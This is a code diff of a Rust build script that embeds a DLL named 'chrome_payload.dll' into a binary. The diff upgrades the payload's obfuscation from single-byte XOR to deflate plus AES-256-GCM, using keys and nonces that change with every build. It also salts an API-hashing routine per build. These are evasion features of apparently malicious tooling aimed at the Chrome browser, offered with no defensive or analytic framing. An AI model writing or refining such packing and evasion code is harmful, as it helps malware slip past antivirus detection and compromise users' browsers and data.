@@ -3,24 +3,59 @@ use flate2::write::DeflateEncoder;
 use flate2::Compression;
 use std::io::Write;
 
-fn obfuscate(dll_bytes: &[u8], key: u8) -> Vec<u8> {
+fn aes256gcm_encrypt(plaintext: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
+    use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};
+    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
+    let n = Nonce::from_slice(nonce);
+    cipher.encrypt(n, plaintext).expect("aes encrypt payload")
+}
+
+fn rand_key_from_seed(seed: u64) -> [u8; 32] {
+    let mut key = [0u8; 32];
+    let mut x = seed ^ 0xDEAD_BEEF_CAFE_F00D;
+    for b in key.iter_mut() {
+        x ^= x << 13;
+        x ^= x >> 7;
+        x ^= x << 17;
+        *b = (x & 0xFF) as u8;
+    }
+    key
+}
+
+fn rand_nonce_from_seed(seed: u64) -> [u8; 12] {
+    let mut nonce = [0u8; 12];
+    let mut x = seed ^ 0xFEEDFACE_CAFEBABE;
+    for b in nonce.iter_mut() {
+        x ^= x << 13;
+        x ^= x >> 7;
+        x ^= x << 17;
+        *b = (x & 0xFF) as u8;
+    }
+    nonce
+}
+
+fn time_seed() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_nanos() as u64)
+        .unwrap_or(0x13374242DEADBEEF)
+        ^ (std::process::id() as u64).wrapping_mul(0x9E3779B97F4A7C15)
+}
+
+fn obfuscate_aes(dll_bytes: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
     let mut encoder = DeflateEncoder::new(Vec::new(), Compression::default());
     encoder.write_all(dll_bytes).expect("compress payload");
     let compressed = encoder.finish().expect("finish compression");
-    compressed.iter().map(|&b| b ^ key).collect()
+    aes256gcm_encrypt(&compressed, key, nonce)
 }
 
-// Generate a random u32 salt using the XOR key + cargo package version hash as
-// entropy source. This produces a different HASH_SALT constant every build when
-// PAYLOAD_XOR_KEY changes, making every api_hash() constant unique per binary.
-fn gen_hash_salt(xor_key: u8, out_dir: &PathBuf) {
+fn gen_hash_salt(seed: u64, out_dir: &PathBuf) {
     use std::collections::hash_map::DefaultHasher;
     use std::hash::{Hash, Hasher};
 
     let mut h = DefaultHasher::new();
-    xor_key.hash(&mut h);
+    seed.hash(&mut h);
     env::var("CARGO_PKG_VERSION").unwrap_or_default().hash(&mut h);
-    // Mix in build timestamp at second granularity so even same-key rebuilds differ.
     std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .map(|d| d.as_secs())
@@ -53,19 +88,21 @@ fn main() {
     res.set_language(0x0409);
     res.compile().expect("Failed to compile resources");
 
-    let key_str = env::var("PAYLOAD_XOR_KEY").unwrap_or_default();
-    let key: u8 = if key_str.is_empty() {
-        let fallback = env!("CARGO_PKG_VERSION").len() as u8;
-        if fallback == 0 { 0xA5 } else { fallback }
-    } else {
-        key_str.parse::<u8>().unwrap_or(0xA5)
-    };
+    // Per-build random AES key + nonce for payload embedding
+    let seed = time_seed();
+    let aes_key   = rand_key_from_seed(seed);
+    let aes_nonce = rand_nonce_from_seed(seed.wrapping_add(0xCAFEBABEDEADBEEF));
 
-    // Generate per-build API hash salt (written to OUT_DIR/api_hash_salt.rs,
-    // included by src/core_utils/api_hash.rs).
-    gen_hash_salt(key, &out_dir);
+    // Generate per-build API hash salt
+    gen_hash_salt(seed, &out_dir);
 
-    // 1. Trouver la DLL 64-bit
+    // Write AES key and nonce as binary files for ci.rs to include
+    let key_path   = out_dir.join("payload_key.bin");
+    let nonce_path = out_dir.join("payload_nonce.bin");
+    fs::write(&key_path,   &aes_key).expect("write payload_key.bin");
+    fs::write(&nonce_path, &aes_nonce).expect("write payload_nonce.bin");
+
+    // Find the payload DLL
     let candidates = [
         env::var("CHROME_PAYLOAD_DLL").ok().map(PathBuf::from),
         Some(manifest_dir.join("target/release/chrome_payload.dll")),
@@ -81,14 +118,11 @@ fn main() {
         .find(|p| p.exists() && p.metadata().map(|m| m.len()).unwrap_or(0) > 0)
         .expect("chrome_payload.dll not found");
 
-    let dll_bytes = fs::read(&dll_path).expect("read payload DLL");
-    let obfuscated = obfuscate(&dll_bytes, key);
+    let dll_bytes  = fs::read(&dll_path).expect("read payload DLL");
+    let obfuscated = obfuscate_aes(&dll_bytes, &aes_key, &aes_nonce);
 
     let out_path = out_dir.join("payload_obf.bin");
     fs::write(&out_path, &obfuscated).expect("write obfuscated payload");
-
-    let key_path = out_dir.join("payload_key.bin");
-    fs::write(&key_path, [key]).expect("write key file");
 
     if let Ok(prefix) = env::var("COMPILE_PREFIX") {
         println!("cargo:rustc-env=COMPILE_PREFIX={}", prefix);
@@ -99,10 +133,9 @@ fn main() {
 
     println!("cargo:rerun-if-changed={}", dll_path.display());
     println!(
-        "cargo:warning=embedded payload (compressed + obfuscated) from {} ({} -> {} bytes, key=0x{:02X})",
+        "cargo:warning=embedded payload (deflate+AES-256-GCM) from {} ({} -> {} bytes)",
         dll_path.display(),
         dll_bytes.len(),
         obfuscated.len(),
-        key
     );
 }
